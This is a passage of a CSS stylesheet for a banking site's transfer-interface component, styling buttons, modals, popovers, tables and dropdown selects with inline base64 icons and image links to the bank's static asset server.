  font-family: 'sourcesanspro', sans-serif;
  font-size: 1rem;
  color: #333; }
  .vupri_wrapper strong {
    font-weight: 600; }
  @media only screen and (max-width: 768px) {
    .vupri_wrapper {
      min-height: inherit; } }
  .vupri_wrapper .vupri_btn {
    font-family: 'sourcesanspro', sans-serif; }
  .vupri_wrapper .vupri_btn ~ .vupri_btn,
  .vupri_wrapper .vupri_btn ~ .vupri_btn_container {
    margin-left: 2rem; }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper .vupri_btn ~ .vupri_btn,
      .vupri_wrapper .vupri_btn ~ .vupri_btn_container {
        margin: 1rem 0 0; } }
  .vupri_wrapper .vupri_btn ~ .vupri_link,
  .vupri_wrapper .vupri_btn_container ~ .vupri_link,
  .vupri_wrapper .vupri_btns_container ~ .vupri_link {
    display: block;
    margin: 2.5rem auto 0; }
  .vupri_wrapper .vupri_btn ~ .vupri_statut-vir {
    margin: 1.5rem auto 0;
    font-size: 0.875rem; }
  .vupri_wrapper .vupri_statut-vir {
    font-size: 0.875rem; }
  .vupri_wrapper .vupri_title {
    margin-bottom: 2rem;
    font-size: 1.25rem;
    text-align: center;
    color: #333; }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper .vupri_title {
        width: 90%;
        margin: 0 auto 2rem;
        font-size: 1.125rem;
        font-weight: 300; } }
  .vupri_wrapper .vupri_btn + .vupri_btn {
    margin-left: 2rem; }
  .vupri_wrapper .vupri_link {
    color: #333;
    text-decoration: underline;
    transition: color .3s; }
    .vupri_wrapper .vupri_link:hover, .vupri_wrapper .vupri_link:focus {
      color: #f05b6f; }
  .vupri_wrapper .vupri_picto {
    display: inline-block;
    vertical-align: middle; }
    .vupri_wrapper .vupri_picto--info {
      width: 26px;
      height: 26px;
      margin-left: 1rem;
      background-image: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/c0d2bf8151c11eb2426a16dc2a38625a.png);
      background-repeat: no-repeat;
      background-position: -52px 0;
      background-size: 156px 78px;
      cursor: pointer; }
      .vupri_wrapper .vupri_picto--info:hover, .vupri_wrapper .vupri_picto--info:focus, .vupri_wrapper .vupri_picto--info.active {
        background-position: -52px -26px; }
  .vupri_wrapper .vupri_hide {
    display: none; }
  .vupri_wrapper .upper {
    text-transform: uppercase; }
  .vupri_wrapper .smaller {
    font-size: 0.75rem; }
  .vupri_wrapper .sr-only {
    position: absolute;
    left: -9999px; }
  .vupri_wrapper .vupri_printing {
    margin: 0 auto 1rem;
    max-width: 48rem;
    overflow: hidden;
    text-align: right;
    cursor: pointer; }
    .vupri_wrapper .vupri_printing__button {
      background: none;
      cursor: pointer; }
      .vupri_wrapper .vupri_printing__button:focus .vupri_printing__label, .vupri_wrapper .vupri_printing__button:focus .vupri_icon__print, .vupri_wrapper .vupri_printing__button:hover .vupri_printing__label, .vupri_wrapper .vupri_printing__button:hover .vupri_icon__print, .vupri_wrapper .vupri_printing__button:active .vupri_printing__label, .vupri_wrapper .vupri_printing__button:active .vupri_icon__print {
        color: #f05b6f; }
      @media print {
        .vupri_wrapper .vupri_printing__button {
          display: none; } }
    .vupri_wrapper .vupri_printing__label, .vupri_wrapper .vupri_printing .vupri_icon__print {
      -webkit-transition: color .3s;
      -moz-transition: color .3s;
      transition: color .3s;
      vertical-align: middle; }
    .vupri_wrapper .vupri_printing .vupri_icon__print {
      width: 1.375rem;
      height: 1.375rem; }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper .vupri_printing {
        padding: 1rem 1rem 0;
        max-width: 32rem;
        margin-bottom: 0.5rem; } }

@media print {
  .dcw_gb_wrapper {
    padding: 0;
    margin: 0; }
    .dcw_gb_wrapper .vupri_wrapper {
      min-height: 0; } }

.vupri_wrapper .vupri_link {
  color: #333;
  font-family: 'sourcesanspro', sans-serif;
  text-decoration: underline;
  border: 0;
  background: none;
  transition: color .3s;
  cursor: pointer; }
  .vupri_wrapper .vupri_link:hover {
    color: #f05b6f; }
  .vupri_wrapper .vupri_link--double-stripes:before {
    content: '';
    display: inline-block;
    vertical-align: middle;
    margin-right: 0.5rem;
    width: .5em;
    height: .5em;
    background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAIGNIUk0AAHolAACAgwAA+f8AAIDpAAB1MAAA6mAAADqYAAAXb5JfxUYAAAC0SURBVHjarJOxDcIwEEW/w0VZIVWSKZBLZmAVz8EI7JLKspiCSKmo6M+SaRIUXXwSYH75/P19d7YP1tqhbdtr13W3eZ6fWKRxqSrGeEkpnZl5tNYO64LGdwFE5ABMAPqtWeNSZi2XmUcAPYCprutTCOGu8V1ASYjZpv0SYmRP34aY3GCkuWmao/f+keMVClV90kLu9JX/b4hF11j0kEo2vz9TzqRxKSIiF2MEEbmtSeNSrwEAZgP+p8ZkNUYAAAAASUVORK5CYII=) no-repeat center/0.5em; }
  .vupri_wrapper .vupri_link--renew:before {
    content: '';
    display: inline-block;
    vertical-align: middle;
    margin-right: 0.5rem;
    width: 1rem;
    height: 1.125rem;
    background: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/a02efc980f2c957e30dad58ce6469ab0.png) no-repeat center/1rem 1.125rem; }
  .vupri_wrapper .vupri_link--picto {
    font-size: 0; }
    .vupri_wrapper .vupri_link--picto:before {
      content: '';
      display: inline-block;
      vertical-align: middle;
      margin-right: 0.5rem;
      width: 1.25em;
      height: 1.5625em;
      font-size: 1rem;
      background: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/f21683f9b48883f6f903309956ff8f03.png) no-repeat center/1.25em 1.5625em; }
    .vupri_wrapper .vupri_link--picto > span {
      display: inline-block;
      vertical-align: middle;
      font-size: 1rem;
      text-decoration: underline; }
  .vupri_wrapper .vupri_link--large {
    font-weight: 600; }
    .vupri_wrapper .vupri_link--large:before {
      width: 1.5em;
      height: 1.875em;
      background: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/9ff16713a9e24e5682fbbf885138c776.png) no-repeat center/1.5em 1.875em; }
    .vupri_wrapper .vupri_link--large > span {
      font-size: 1.125rem;
      text-decoration: none; }

.vupri_wrapper .vupri_btn {
  display: inline-block;
  padding: 0.75em 1rem;
  width: 14.375rem;
  font-size: 1.0625rem;
  font-weight: 600;
  line-height: 1;
  text-align: center;
  text-decoration: none;
  -webkit-appearance: none;
  appearance: none;
  border: none;
  border: 2px solid;
  border-radius: 3.125rem;
  background-color: #fff;
  cursor: pointer; }
  .vupri_wrapper .vupri_btn--primary {
    border: solid 2px #f05b6f;
    border-radius: 3.125rem;
    color: #fff;
    background-color: #f05b6f; }
    .vupri_wrapper .vupri_btn--primary:hover {
      border: solid 2px #ee425b;
      background-color: #ee425b; }
    .vupri_wrapper .vupri_btn--primary.is-disabled {
      opacity: 0.4;
      cursor: default; }
      .vupri_wrapper .vupri_btn--primary.is-disabled:focus {
        /* outline: none; */ }
      .vupri_wrapper .vupri_btn--primary.is-disabled:hover {
        border: solid 2px #f05b6f;
        background-color: #f05b6f; }
  .vupri_wrapper .vupri_btn--secondary {
    border-color: #dedede;
    color: #333;
    background-color: #dedede; }
    .vupri_wrapper .vupri_btn--secondary:hover, .vupri_wrapper .vupri_btn--secondary:focus {
      border-color: #c1c1c1;
      background-color: #c1c1c1; }
    .vupri_wrapper .vupri_btn--secondary.is-disabled {
      opacity: 0.4;
      cursor: default; }
      .vupri_wrapper .vupri_btn--secondary.is-disabled:focus {
        outline: none; }
      .vupri_wrapper .vupri_btn--secondary.is-disabled:hover {
        border: solid 2px #dedede;
        background-color: #dedede; }
  .vupri_wrapper .vupri_btn--ghost-light, .vupri_wrapper .vupri_btn--ghost-dark {
    background-color: transparent; }
    .vupri_wrapper .vupri_btn--ghost-light:hover, .vupri_wrapper .vupri_btn--ghost-light:focus, .vupri_wrapper .vupri_btn--ghost-dark:hover, .vupri_wrapper .vupri_btn--ghost-dark:focus {
      border-color: #f05b6f;
      color: #f05b6f; }
  .vupri_wrapper .vupri_btn--ghost-light {
    border-color: #fff;
    color: #fff; }
    .vupri_wrapper .vupri_btn--ghost-light.is-disabled {
      opacity: .5;
      cursor: default; }
      .vupri_wrapper .vupri_btn--ghost-light.is-disabled:hover {
        background-color: transparent; }
  .vupri_wrapper .vupri_btn--ghost-dark {
    border-color: #333;
    color: #333; }
    .vupri_wrapper .vupri_btn--ghost-dark.is-disabled {
      opacity: .5;
      cursor: default; }
      .vupri_wrapper .vupri_btn--ghost-dark.is-disabled:hover {
        background-color: transparent; }

.vupri_wrapper .boutonsVirements {
  clear: both;
  margin: 0 0 2rem;
  padding: 0;
  list-style: none outside none;
  overflow: hidden; }

.vupri_wrapper .itemVirement {
  display: block;
  float: left;
  height: 20px;
  padding: 4px 16px 0px 12px;
  margin: 0;
  background: url(data:image/gif;base64,R0lGODlhAQAYAIQYAMfHx8jIyMrKysvLy8zMzM7Ozs/Pz9DQ0NLS0tPT09XV1dbW1tfX19nZ2dra2tzc3Ofn5+jo6Onp6erq6uvr6+zs7O3t7e7u7v///////////////////////////////yH+EUNyZWF0ZWQgd2l0aCBHSU1QACH5BAEKAB8ALAAAAAABABgAAAUU4GVV1CRF0OM0zKIkyGEUxCAEQAgAOw==) repeat-x scroll left top transparent;
  font-family: Arial, Helvetica, sans-serif;
  font-size: 12px;
  font-weight: bold;
  text-align: center;
  white-space: nowrap;
  overflow: hidden;
  box-sizing: content-box; }

.vupri_wrapper .itemVirementBorder {
  border-left: 1px solid #979797; }

.vupri_wrapper .itemVirementActif {
  background: url(data:image/gif;base64,R0lGODlhWgEYAKUjABRwyxhzzB13ziJ60Cd+0iuB1DCF1jWI2DqM2j+P20ST3UiW302a4VKd41eh5Vuk52Kn53Ov6JDA7JHC8JTF8JfH8prK857M9aHP9qTR96jU+bPS8LXU8bfV8bnW8rrX88Hd9t/t+vT5/f///////////////////////////////////////////////////////////////////////////////////////////////////////////////////yH5BAEKAD8ALAAAAABaARgAQAb+QI1wSCwaj8ikcslsOp/QqHRKrVqv2Gz1we2CuuCweEwum8/otHrNbrvf8Lh8Tq+3D/j8Js/v+/+AgYKDhIWGh4iJiouMjY6PkJGJFpSVlpeYmZqbnJ2en6ChoqOkpaanqKmqq6cLrq8jsSMfr7W2t7i5uru8vb6/wMHCw8TFxsfIycq+A83Oz9DR0tPU1dbX2Nna29zd3t/g4eLj5OAY5+jp6uvs7e7v8PHy8/T19vf4+fr7/P3++hQCChxIsKDBgwgTKlzIsKHDhxAjSpxIsaLFixgpNtjIMZaICBxDihxJsqTJkyhTqlzJsqXLlzBjypxJs6bNlQly6ozVQaf+z59AgwodSrSo0aNIkypdyrSp06dQo0qdmrSA1atYs2rdyrWr169gw4odS7as2bNo06pdy7Zt2gBw48qdS7eu3bt48+rdy7ev37+AAwseTLiw4cODMyhezLix48eQI0ueTLmy5cuYM2vezLmz58+gQ3e+QLq06dOoU6tezbq169ewY8ueTbu27du4c+vefbuC79/AgwsfTry48ePIkytfzry58+fQo0ufTr169AnYs2vfzr279+/gw4sfT768+fPo06tfz769+/frHcifPyIEhPn48+vfz7+///8ABijggAQWaOCBCCao4IIMNjggAxBGKMsIEkRo4YUYZqjhhhzgdujhhyCGKOKIJJZo4okopqjiih8q4OKLsnjw4ow01mjjjTjmqOOOPPbo449ABinkkEQWaeSRSPaIwJJMjsABk1BGKeWUVFZp5ZVYZqnlllx26eWXYIYp5phklsmlAWimqeaabLbp5ptwxinnnHTWaeedeOap55589unnn3sSIOighBZq6KGIJqrooow26uijkEYq6aSUVmrppZhmWqkAnHbq6aeghirqqKSWauqpqKaq6qqsturqq7DGKuusrwJg66245qrrrrz26uuvwAYr7LDEFmvsscgmq+yyzDabbBAAOw==) no-repeat scroll left top transparent; }

.vupri_wrapper .vupri_alertbox {
  display: table;
  position: relative;
  width: 100%;
  max-width: 48.75em;
  margin: 0 auto 3rem;
  padding: 1.5rem 2rem 1.5rem 5.5em;
  color: #333;
  border: 1px solid #dedede; }
  .vupri_wrapper .vupri_alertbox__icon {
    position: absolute;
    left: 2rem;
    top: 50%;
    width: 2.5rem;
    height: 2.5rem;
    transform: translateY(-50%); }
  .vupri_wrapper .vupri_alertbox__content {
    display: table-cell;
    vertical-align: middle; }
  .vupri_wrapper .vupri_alertbox__title, .vupri_wrapper .vupri_alertbox__message, .vupri_wrapper .vupri_alertbox__link {
    font-size: 1.125rem; }
  .vupri_wrapper .vupri_alertbox__title {
    margin-bottom: 0.25rem;
    color: #333;
    font-weight: 600; }
  .vupri_wrapper .vupri_alertbox__link {
    color: #333;
    text-decoration: underline;
    cursor: pointer;
    transition: color .3s; }
    .vupri_wrapper .vupri_alertbox__link:hover {
      color: #f05b6f; }
  .vupri_wrapper .vupri_alertbox--inline {
    padding: 1.5rem 2rem;
    text-align: center;
    border: 0; }
    .vupri_wrapper .vupri_alertbox--inline .vupri_alertbox__icon {
      display: inline-block;
      position: inherit;
      left: inherit;
      top: inherit;
      transform: inherit;
      width: 5rem;
      height: 5rem;
      margin-bottom: 2.5rem; }
    .vupri_wrapper .vupri_alertbox--inline .vupri_alertbox__title {
      margin-bottom: 2rem;
      font-size: 1.75rem; }
    .vupri_wrapper .vupri_alertbox--inline .vupri_alertbox__title + .vupri_btn,
    .vupri_wrapper .vupri_alertbox--inline .vupri_alertbox__message + .vupri_btn {
      margin-top: 4rem; }
    .vupri_wrapper .vupri_alertbox--inline .vupri_alertbox__title + .vupri_link,
    .vupri_wrapper .vupri_alertbox--inline .vupri_alertbox__message + .vupri_link {
      display: block;
      margin-top: 1rem;
      margin-bottom: 3rem; }
  @media screen and (max-width: 768px) {
    .vupri_wrapper .vupri_alertbox {
      padding: 5.5rem 1rem 1rem;
      border: none;
      border-bottom: 0.0625em solid #dedede;
      background-position: center 1.125em;
      background-size: 3.25em;
      text-align: center; }
      .vupri_wrapper .vupri_alertbox__icon {
        top: 1.5rem;
        left: 50%;
        transform: translateX(-50%); }
      .vupri_wrapper .vupri_alertbox--inline {
        border: 0;
        padding-top: 1.5rem; }
        .vupri_wrapper .vupri_alertbox--inline .vupri_alertbox__icon {
          width: 4rem;
          height: 4rem;
          margin-bottom: 1.5rem; }
        .vupri_wrapper .vupri_alertbox--inline .vupri_alertbox__title,
        .vupri_wrapper .vupri_alertbox--inline .vupri_alertbox__message {
          font-size: 1.125rem; }
        .vupri_wrapper .vupri_alertbox--inline .vupri_alertbox__title {
          margin-bottom: 1rem; }
        .vupri_wrapper .vupri_alertbox--inline .vupri_alertbox__title + .vupri_btn,
        .vupri_wrapper .vupri_alertbox--inline .vupri_alertbox__message + .vupri_btn {
          margin-top: 2rem; } }

.vupri_wrapper .vupri_modal_overlay {
  display: block;
  position: fixed;
  z-index: 9999;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: rgba(0, 0, 0, 0.5); }

.vupri_wrapper .vupri_modal {
  position: absolute;
  z-index: 9999;
  top: 50%;
  left: 50%;
  width: 86%;
  max-width: 610px;
  max-height: 80%;
  padding: 50px;
  border-radius: 10px;
  outline: none;
  text-align: center;
  background-color: #fff;
  box-shadow: 0 8px 15px 0 rgba(0, 0, 0, 0.2);
  -webkit-transform: translateX(-50%) translateY(-50%);
  transform: translateX(-50%) translateY(-50%); }
  @media only screen and (max-width: 768px) {
    .vupri_wrapper .vupri_modal {
      width: 90%;
      max-width: 475px;
      padding: 2.5rem 1rem; } }
  .vupri_wrapper .vupri_modal__cross {
    position: absolute;
    top: .5rem;
    right: -2rem;
    display: block;
    width: 20px;
    height: 21px;
    background-color: transparent;
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAqCAYAAAG2MSnwAAAAAXNSR0IArs4c6QAAA1RJREFUWAnFWctyEzEQdPwZKZK1U/w/V1zmV5J1DBw4myuYbq1GHs1Kq4dZmCpZ0kxPT69WlhXYXK/XYZMyBK7i1+MNJzQGt4KY9YJgQI9jICJRdcwPhL+w+dRzSPGBm8Mj3hH4iLZzSAwCwgeeA0U0QHRAo7liURAT+M8MBj+BdMBcAvoYEJB+AADF0ZIVZiUA5JPQpoXB4MCZZZY5Qi6BTBdx5npgjg/4cGwPsBTQx6c15IRmgZP3+h75vTOA/XxiipCYCHgRJEkClrn0WxmwJwjdSY05jM0zjeJNMltQEpwDJcHiXOzBeBE96NM7ZpHBLYLsuOk9kEiRclhFDJzb2z43ftMUQSIflC5JjKAmOhceIE/cTGQrgcAqpvKyIkskcySHxSaTsr1gqnok6jXSu1OOA+HeLRLmiGwScJY4PiRriSqIn7hVvqDRwqPZxNIcuUExCY9oh1LSUhz5Axq/cc/u7MCA1rUdkKe31oWE+o02kSJ3j6ZtcE8CTzMpcrQyksZ7s4W0SCYLXkOaIHuR/GS/RNpMJhVSpN1kOVIQalt+TCGxPRj02xfCPjKSg8Hus6Z9GglMkInC+W9HlJmYINNu2gG+r8KI/pRIS7sAnpEJspl0iSxDmj/yasgU6Tfgxd7EH3pEso8ZQGaAnDRpD5lwG9JX54dT23SeSUZFj2St9NNW5exwk23eY8j5AI7vnkfzKep7hpAsv3ry6Pz+9n9fO8WwJpq9qRz5yL8M5xPmrwD/E6Gow/PnzJpo8QVks/nttAFA9RSUslWEohBr2hWT+vTHv6FU6pNWFVqokRbmllF9FEi6VnQNzr+yoqsIU4vphj1FenJs3eZ5TdEaTHPh1oSCCIRn1rVvW3XN8JDBoyL3rafK/yOMSlGcB2zuHKM4sbqjY/b4nQ5U5arlhL0hpu96IpL9ukJRYOl1joiHqwvG/Is0J/SE2K5zfeZpIKsWZrMLQkfEw0PZ3OL8HmGW3AvVFz24go0Y1QsFuHvFrDA7BzdffU4o96+9zdwo1hR2qzKNCkJ51eOVL4AHOM5oKRvhrF9+Ia3swb20ohT6yPNM/wMpps5GfK4mzOpHrZzQHxQ4oPHa/xPtM9pteS3TynPU3qOJFv4vwuPKJe+n/wNsZBrHOelggQAAAABJRU5ErkJggg==);
    background-size: 20px 21px;
    transition: transform .4s;
    cursor: pointer; }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper .vupri_modal__cross {
        top: -2rem;
        right: .5rem; } }
  .vupri_wrapper .vupri_modal__picto {
    display: inline-block;
    width: 5em;
    height: 5em;
    background: no-repeat center/5em;
    margin-bottom: 2rem; }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper .vupri_modal__picto {
        margin-bottom: 1.5rem; } }
    .vupri_wrapper .vupri_modal__picto--valid {
      background-image: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/67d9334cda2df22fe80c913233281189.png); }
    .vupri_wrapper .vupri_modal__picto--info {
      background-image: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/d2fc008db6456447666547b7962d10b3.png); }
    .vupri_wrapper .vupri_modal__picto--off {
      background-image: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/6c9b88b0626ce5b6e58e9f2ba5289d0a.png); }
    .vupri_wrapper .vupri_modal__picto--alert {
      background-image: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/d74b2cbd729d0f83b95f295dbcab2381.png); }
  .vupri_wrapper .vupri_modal__content {
    font-size: 1.5em;
    line-height: 1.3;
    margin-bottom: 2.5em; }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper .vupri_modal__content {
        margin-bottom: 2rem;
        font-size: .875rem; } }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper .vupri_modal__content--vi {
        margin-bottom: 0; } }
  .vupri_wrapper .vupri_modal .vupri_btn {
    float: none; }
  @media only screen and (max-width: 768px) {
    .vupri_wrapper .vupri_modal .vupri_btn + .vupri_btn {
      margin-left: 0; } }
  .vupri_wrapper .vupri_modal__title {
    margin-bottom: 1.5rem; }
  .vupri_wrapper .vupri_modal .vupri_table {
    display: block;
    margin: 1rem auto 2rem;
    max-width: 28rem; }
    @media screen and (max-width: 768px) {
      .vupri_wrapper .vupri_modal .vupri_table {
        margin-bottom: 2.5rem; } }

.vupri_wrapper .vupri_popover {
  display: inline-block;
  position: relative;
  z-index: 9;
  padding: 1rem;
  max-width: 504px;
  min-width: 200px;
  color: #333;
  text-align: left;
  border-radius: 5px;
  border: 1px solid #dedede;
  background-color: #fff; }
  .vupri_wrapper .vupri_popover_container {
    position: relative; }
  .vupri_wrapper .vupri_popover:before {
    content: '';
    display: block;
    position: absolute;
    width: 12px;
    height: 12px;
    border-style: solid;
    border-width: 1px 0 0 1px;
    border-color: #dedede;
    background-color: #fff;
    transform: rotate(45deg); }
  .vupri_wrapper .vupri_popover--top-right:before {
    top: -7px;
    right: 20%; }
  .vupri_wrapper .vupri_popover--top-left:before {
    top: -7px;
    left: 20%; }
  .vupri_wrapper .vupri_popover--bottom-right:before, .vupri_wrapper .vupri_popover--bottom-left:before {
    bottom: -7px;
    border-width: 0 1px 1px 0; }
  .vupri_wrapper .vupri_popover--bottom-right:before {
    right: 20%; }
  .vupri_wrapper .vupri_popover--bottom-left:before {
    left: 20%; }
  .vupri_wrapper .vupri_popover--ip {
    position: absolute;
    min-width: 350px;
    top: -118px;
    left: 186px; }
    .vupri_wrapper .vupri_popover--ip:before {
      bottom: -7px;
      left: 20%;
      border-width: 0 1px 1px 0; }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper .vupri_popover--ip {
        top: 40px;
        left: 0;
        max-width: 288px;
        min-width: 0; }
        .vupri_wrapper .vupri_popover--ip:before {
          top: -7px;
          left: 253px;
          border-width: 1px 0 0 1px; } }
  .vupri_wrapper .vupri_popover__message {
    font-size: 0.875rem;
    line-height: normal; }

.vupri_wrapper .vupri_table {
  text-align: left; }
  .vupri_wrapper .vupri_table__desc {
    border-bottom: 1px solid #d4d4d4;
    padding-bottom: 1.5rem;
    margin-bottom: 1.5rem;
    font-size: 1.25rem;
    text-align: center; }
  .vupri_wrapper .vupri_table__row {
    display: table-row; }
  .vupri_wrapper .vupri_table__cell, .vupri_wrapper .vupri_table__header {
    padding-left: 1.5rem;
    text-align: left;
    font-weight: 600; }
  .vupri_wrapper .vupri_table__col {
    display: inline-block; }
    .vupri_wrapper .vupri_table__col:first-of-type {
      width: 65%; }
  .vupri_wrapper .vupri_table__header {
    color: #999;
    font-size: 0.75rem; }
  @media screen and (max-width: 768px) {
    .vupri_wrapper .vupri_table__desc {
      padding-bottom: 1rem;
      margin-bottom: 1rem; }
    .vupri_wrapper .vupri_table__cell, .vupri_wrapper .vupri_table__header {
      padding: 0; }
    .vupri_wrapper .vupri_table__col {
      display: block; }
      .vupri_wrapper .vupri_table__col:first-of-type {
        width: 100%;
        margin-bottom: 1.25rem; } }

.vupri_wrapper .vupri_menu-vir {
  position: absolute;
  top: 0.5rem;
  right: 1rem; }
  .vupri_wrapper .vupri_menu-vir__btn {
    display: inline-block;
    border: 1px solid transparent;
    background-color: #fff;
    cursor: pointer; }
    .vupri_wrapper .vupri_menu-vir__btn:hover, .vupri_wrapper .vupri_menu-vir__btn:focus {
      color: #f05b6f;
      border: 1px solid #f05b6f;
      border-radius: 1rem; }
    .vupri_wrapper .vupri_menu-vir__btn.is-open + .vupri_menu-vir__list {
      display: block; }
  .vupri_wrapper .vupri_menu-vir__list {
    display: none;
    position: absolute;
    top: 2rem;
    padding: 1.5rem;
    right: 0;
    width: 13.5rem;
    border-radius: 5px;
    box-shadow: 0 8px 25px 0 rgba(0, 0, 0, 0.15);
    background-color: #fff;
    z-index: 1; }
  .vupri_wrapper .vupri_menu-vir__item {
    display: flex;
    align-items: center;
    line-height: 1; }
    .vupri_wrapper .vupri_menu-vir__item:not(:last-child) {
      margin-bottom: 1rem; }
    .vupri_wrapper .vupri_menu-vir__item > svg {
      display: inline-block;
      margin-right: 0.25rem;
      vertical-align: middle; }
    .vupri_wrapper .vupri_menu-vir__item .vupri_icon__refresh {
      -webkit-transition: background .3s;
      -moz-transition: background .3s;
      transition: background .3s;
      margin-right: 0.25rem; }
    .vupri_wrapper .vupri_menu-vir__item .vupri_link {
      display: flex;
      align-items: center;
      margin-left: 0.25rem;
      font-size: 0.875rem; }
      .vupri_wrapper .vupri_menu-vir__item .vupri_link:hover .vupri_icon__refresh, .vupri_wrapper .vupri_menu-vir__item .vupri_link:focus .vupri_icon__refresh, .vupri_wrapper .vupri_menu-vir__item .vupri_link:active .vupri_icon__refresh {
        background: url("data:image/svg+xml;charset=utf8,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2216%22 height=%2218%22 viewBox=%220 0 16 18%22%3E%3Cpath fill=%22%23f05b6f%22 fill-rule=%22nonzero%22 d=%22M15.426 6.933a.687.687 0 1 0-1.275.517c.315.79.476 1.626.476 2.488 0 3.681-2.972 6.677-6.626 6.677-3.654 0-6.626-2.996-6.626-6.677 0-3.68 2.972-6.676 6.626-6.676.528 0 1.044.07 1.548.191l-.871.353a.694.694 0 0 0 .256 1.335.674.674 0 0 0 .255-.05l2.58-1.043a.693.693 0 0 0 .381-.9L11.07.435a.686.686 0 0 0-.894-.385.694.694 0 0 0-.382.9l.505 1.27A7.927 7.927 0 0 0 8 1.878c-4.411 0-8 3.617-8 8.061C0 14.384 3.589 18 8 18s8-3.616 8-8.06c0-1.041-.192-2.052-.574-3.007z%22/%3E%3C/svg%3E") no-repeat; }

.vupri_wrapper .vupri_select {
  position: relative;
  height: 2.5em; }
  .vupri_wrapper .vupri_select__toggle {
    display: inline-block;
    position: relative;
    width: 100%;
    height: 100%;
    padding: 0.5rem;
    font-size: 1.125rem;
    text-align: left;
    color: #666;
    background-color: transparent;
    border: none;
    border-bottom: 1px solid #999;
    cursor: pointer; }
    .vupri_wrapper .vupri_select__toggle:before {
      content: '';
      display: block;
      float: right;
      width: 1.625rem;
      height: 1.625rem;
      background-image: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/c0d2bf8151c11eb2426a16dc2a38625a.png);
      background-repeat: no-repeat;
      background-position: -6.5rem -1.625rem;
      background-size: 9.75rem 4.875rem;
      transition: transform .3s; }
  .vupri_wrapper .vupri_select.is-open > .vupri_select__list {
    max-height: 13.75rem;
    border-right: 1px solid #dedede;
    border-bottom: 1px solid #dedede;
    border-left: 1px solid #dedede; }
  .vupri_wrapper .vupri_select.is-open .vupri_select__toggle:before {
    transform: rotate(-180deg); }
  .vupri_wrapper .vupri_select.is-selected .vupri_select__toggle {
    color: #333;
    border-color: #333; }
  .vupri_wrapper .vupri_select__list {
    position: relative;
    z-index: 3;
    width: 100%;
    max-height: 0;
    margin: 0;
    padding: 0;
    border-bottom-left-radius: 5px;
    border-bottom-right-radius: 5px;
    background: #fff;
    overflow: auto;
    transition: max-height .3s; }
    .vupri_wrapper .vupri_select__list::-webkit-scrollbar {
      width: 12px;
      padding: .125rem; }
    .vupri_wrapper .vupri_select__list::-webkit-scrollbar-thumb {
      border: 2px solid #fff;
      border-radius: .375rem;
      background: #999; }
  .vupri_wrapper .vupri_select__item {
    padding: 0.5rem;
    cursor: pointer;
    transition: background-color .3s; }
    .vupri_wrapper .vupri_select__item--button {
      background-color: transparent; }
    .vupri_wrapper .vupri_select__item:hover, .vupri_wrapper .vupri_select__item:focus {
      background: #fdeef0; }
  .vupri_wrapper .vupri_select__label {
    position: absolute;
    top: -.75rem;
    left: 0;
    font-size: 0.75rem;
    font-weight: 600;
    color: #999; }

.vupri_wrapper .vupri_super-select {
  border: 1px solid #dedede;
  border-radius: 5px;
  transition: border-color .5s; }
  .vupri_wrapper .vupri_super-select__toggle {
    position: relative;
    width: 100%;
    padding: 0.5625rem 1.5rem;
    font-family: 'sourcesanspro', sans-serif;
    font-size: 1.125rem;
    font-weight: 600;
    text-align: left;
    background-color: transparent;
    border: 0;
    border-bottom: 1px solid #dedede;
    cursor: pointer; }
    .vupri_wrapper .vupri_super-select__toggle:before {
      content: '';
      position: absolute;
      display: block;
      top: 0;
      left: 0;
      width: 100%; }
    .vupri_wrapper .vupri_super-select__toggle:after {
      content: '';
      position: absolute;
      display: block;
      top: 50%;
      right: 1.375rem;
      width: 1.125rem;
      height: .75rem;
      transform: translateY(-50%);
      background-image: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/c0d2bf8151c11eb2426a16dc2a38625a.png);
      background-repeat: no-repeat;
      background-position: -6.75rem -2.0625rem;
      background-size: 9.75rem 4.875rem;
      transition: transform .3s; }
  .vupri_wrapper .vupri_super-select.is-open .vupri_super-select__toggle:after {
    transform: translateY(-50%) rotate(-180deg); }
  .vupri_wrapper .vupri_super-select.is-open .vupri_super-select__list {
    display: block;
    overflow-y: auto; }
  .vupri_wrapper .vupri_super-select.is-open .vupri_super-select__item:not(:last-child) {
    width: 100%; }
  .vupri_wrapper .vupri_super-select.is-open .vupri_super-select__item:not(.vupri_super-select__item--title):hover, .vupri_wrapper .vupri_super-select.is-open .vupri_super-select__item:not(.vupri_super-select__item--title):focus {
    background-color: #fdeef0; }
  .vupri_wrapper .vupri_super-select.is-open .vupri_super-select__item:not(.vupri_super-select__item--selected) {
    display: block; }
  .vupri_wrapper .vupri_super-select.is-open .vupri_super-select__item--default:not(.vupri_super-select__item--selected) {
    display: none; }
  .vupri_wrapper .vupri_super-select.is-open .vupri_super-select__item--selected {
    display: none; }
  .vupri_wrapper .vupri_super-select.is-selected {
    box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.3);
    border: 0;
    border-left: 4px solid #80cbc4; }
    .vupri_wrapper .vupri_super-select.is-selected.vupri_super-select--blue {
      border-left: 4px solid #6badd7; }
    .vupri_wrapper .vupri_super-select.is-selected.is-open {
      border: 1px solid #dedede;
      box-shadow: none; }
  .vupri_wrapper .vupri_super-select__list {
    display: none;
    width: 100%;
    color: #333;
    background: #fff;
